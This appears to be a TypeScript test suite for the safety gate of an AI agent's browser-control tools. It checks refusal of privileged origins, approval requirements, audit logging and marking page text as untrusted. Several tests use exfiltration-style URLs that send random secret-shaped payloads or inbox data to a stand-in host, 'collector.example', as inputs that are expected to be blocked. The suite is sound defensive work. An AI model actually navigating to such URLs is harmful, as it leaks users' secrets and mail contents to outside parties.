import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';
import test from 'node:test';
import { handleBrowserTool } from '../src/browser-tools.js';
import { resetVisited, refuseBlockedOrigin } from '../src/browser-risk.js';
import { classifyOrigin } from '../../browser/src/origin-policy.js';
import { browserContext as context } from './browser-context.js';

test.beforeEach(() => resetVisited('s1'));

test('a blocked origin is refused and never reaches the worker', async () => {
  const ctx = context('chrome://settings');
  await assert.rejects(
    () => handleBrowserTool(ctx.value, 's1', 'browser_read', { format: 'text' }),
    /BROWSER_ORIGIN_BLOCKED|privileged surface/,
  );
  assert.equal(
    ctx.worker.calls.some((call: any) => call.operation.kind === 'browser.read'),
    false,
  );
});

test('navigating to a blocked scheme is refused', async () => {
  const ctx = context();
  await assert.rejects(
    () =>
      handleBrowserTool(ctx.value, 's1', 'browser_navigate', {
        url: 'chrome-extension://abcdefghijklmnopabcdefghijklmnop/options.html',
      }),
    /privileged surface/,
  );
});

test('a navigate url carrying an opaque payload is refused before dispatch', async () => {
  const ctx = context();
  const payload = randomBytes(32).toString('base64url');
  await assert.rejects(
    () =>
      handleBrowserTool(ctx.value, 's1', 'browser_navigate', {
        url: `https://collector.example/r?d=${payload}`,
      }),
    /secret-shaped/,
  );
  assert.equal(
    ctx.worker.calls.some((call: any) => call.operation.kind === 'browser.navigate'),
    false,
  );
});

test('a vision snapshot of a sensitive origin is refused without approval', async () => {
  const ctx = context('https://mail.google.com/mail/u/0/');
  await assert.rejects(
    () => handleBrowserTool(ctx.value, 's1', 'browser_snapshot', { mode: 'vision' }),
    /screenshot/i,
  );
});

test('page text comes back wrapped as untrusted', async () => {
  const ctx = context();
  const result: any = await handleBrowserTool(ctx.value, 's1', 'browser_read', {
    format: 'text',
  });
  assert.equal(result.untrusted, true);
  assert.ok(String(result.notice).length > 0);
});

test('every executed operation is audited with its origin and risk', async () => {
  const ctx = context();
  await handleBrowserTool(ctx.value, 's1', 'browser_read', { format: 'text' });
  const event = ctx.audit.events.at(-1);
  assert.equal(event.operation, 'browser:read');
  assert.equal(event.target, 'https://example.com');
  assert.equal(event.risk, 'LOW');
  assert.equal(event.result, 'SUCCEEDED');
});

test('leaving a sensitive origin is HIGH even when the destination is ordinary', async () => {
  const ctx = context('https://mail.google.com/mail/u/0/');
  await assert.rejects(
    () =>
      handleBrowserTool(ctx.value, 's1', 'browser_navigate', {
        url: 'https://collector.example/inbox-summary',
      }),
    /approval/i,
  );
});

test('a vision snapshot is audited by content hash, not by image bytes', async () => {
  const ctx = context();
  ctx.worker.execute = async (input: any) => {
    if (input.operation.kind === 'browser.tabs') {
      return {
        ok: true,
        value: [{ tabId: 't1', url: 'https://example.com/', title: 'x', active: true }],
      };
    }
    return { ok: true, value: { mode: 'vision', imageDataUri: 'data:image/png;base64,AAAA' } };
  };
  await handleBrowserTool(ctx.value, 's1', 'browser_snapshot', { mode: 'vision' });
  const event = ctx.audit.events.at(-1);
  assert.match(event.target, /sha256:[0-9a-f]{64}$/);
  assert.equal(event.target.includes('AAAA'), false);
});

test('there is no tool that evaluates page script', async () => {
  const { BROWSER_TOOL_NAMES } = await import('../src/browser-tools.js');
  for (const name of BROWSER_TOOL_NAMES) {
    assert.equal(/eval|exec|script/i.test(name), false, `${name} suggests script execution`);
  }
});

function withoutCapability(deny = false) {
  const ctx = context();
  ctx.value.sessions.activeLease = () => ({ workspaceId: 'w1', capabilities: [] });
  if (deny) {
    ctx.value.deps.permissions = {
      decide: () => ({ outcome: 'deny', reason: 'browser control is not granted here' }),
    };
  }
  return ctx;
}

test('an explicit deny refuses browser control and never reaches the worker', async () => {
  const ctx = withoutCapability(true);
  await assert.rejects(
    () => handleBrowserTool(ctx.value, 's1', 'browser_read', { format: 'text' }),
    /not granted here/,
  );
  assert.deepEqual(ctx.worker.calls, []);
});

test('a session without browser.control cannot run any page operation', async () => {
  for (const tool of ['browser_read', 'browser_snapshot', 'browser_act_many', 'browser_navigate']) {
    const ctx = withoutCapability();
    await assert.rejects(
      () =>
        handleBrowserTool(ctx.value, 's1', tool, {
          format: 'text',
          url: 'https://example.com/',
          actions: [{ op: 'press_key', key: 'Enter' }],
        }),
      /approval|capability/i,
      `${tool} ran without browser.control`,
    );
    assert.deepEqual(
      ctx.worker.calls,
      [],
      `${tool} reached the worker without browser.control - even tab enumeration leaks open URLs`,
    );
  }
});

test('a session without browser.control cannot connect or read status', async () => {
  for (const tool of ['browser_connect', 'browser_status', 'browser_disconnect']) {
    const ctx = withoutCapability();
    await assert.rejects(
      () => handleBrowserTool(ctx.value, 's1', tool, { transport: 'cdp' }),
      /approval|capability/i,
      `${tool} ran without browser.control`,
    );
    assert.deepEqual(ctx.worker.calls, [], `${tool} reached the worker uncapped`);
  }
});

// browser_tabs {action:'open'} navigates the browser just as browser_navigate
// does. It previously skipped both checks below because the gate keyed on the
// tool name rather than on whether a URL was being opened.
test('opening a tab on a blocked origin is refused', async () => {
  const ctx = context();
  await assert.rejects(
    () =>
      handleBrowserTool(ctx.value, 's1', 'browser_tabs', {
        action: 'open',
        url: 'chrome://settings',
      }),
    /privileged surface/,
  );
  assert.equal(
    ctx.worker.calls.some(
      (call: any) => call.operation.kind === 'browser.tabs' && call.operation.action === 'open',
    ),
    false,
  );
});

test('opening a tab with a secret-shaped url is refused before dispatch', async () => {
  const ctx = context();
  const payload = randomBytes(32).toString('base64url');
  await assert.rejects(
    () =>
      handleBrowserTool(ctx.value, 's1', 'browser_tabs', {
        action: 'open',
        url: `https://collector.example/r?d=${payload}`,
      }),
    /secret-shaped/,
  );
});

test('opening a tab on an unseen domain is not treated as a read-only operation', async () => {
  const ctx = context();
  // First visit to a new registrable domain is MEDIUM, so with no approval
  // service wired it must stop rather than run as if it were a tab listing.
  await assert.rejects(
    () =>
      handleBrowserTool(ctx.value, 's1', 'browser_tabs', {
        action: 'open',
        url: 'https://not-seen-before.test/',
      }),
    /approval/i,
  );
});

test('listing tabs stays read-only and is unaffected', async () => {
  const ctx = context();
  const listed: any = await handleBrowserTool(ctx.value, 's1', 'browser_tabs', { action: 'list' });
  assert.equal(listed.untrusted, true);
});

test('a configured admin port stays BLOCKED through the tool policy path', () => {
  const snapshot = {
    aevraPorts: [8443, 9000, 9001, 9002],
    loopbackClass: 'NORMAL' as const,
    blockedHosts: [],
    sensitiveHosts: [],
  };
  assert.equal(classifyOrigin('http://127.0.0.1:9000/settings', snapshot), 'BLOCKED');
  assert.throws(
    () => refuseBlockedOrigin('http://127.0.0.1:9000/settings', snapshot),
    /BROWSER_ORIGIN_BLOCKED|privileged surface/,
  );
});
